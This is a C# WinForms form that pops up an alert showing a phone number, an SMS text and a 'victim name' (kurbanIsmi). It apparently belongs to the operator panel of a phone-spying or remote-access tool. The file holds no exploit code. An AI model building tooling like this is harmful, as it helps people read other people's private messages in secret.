using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

namespace SV
{
    public partial class smsgeldi : MetroFramework.Forms.MetroForm
    {
        SoundPlayer sp;
        public smsgeldi(string numara, string icerik, string kurbanIsmi)
        {
            InitializeComponent();
            metroLabel1.Text = numara;
            richTextBox1.Text = icerik;
            Text += " =>" + kurbanIsmi;
            Screen ekran = Screen.FromPoint(Location);
            Location = new Point(ekran.WorkingArea.Right - Width, ekran.WorkingArea.Bottom - Height);
            sp = new SoundPlayer("sms.wav"); sp.Play();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            sp.Stop();
            Close();
        }

        private void richTextBox1_LinkClicked(object sender, LinkClickedEventArgs e)
        {
            try { System.Diagnostics.Process.Start(e.LinkText); } catch (Exception) { }
        }
    }
}
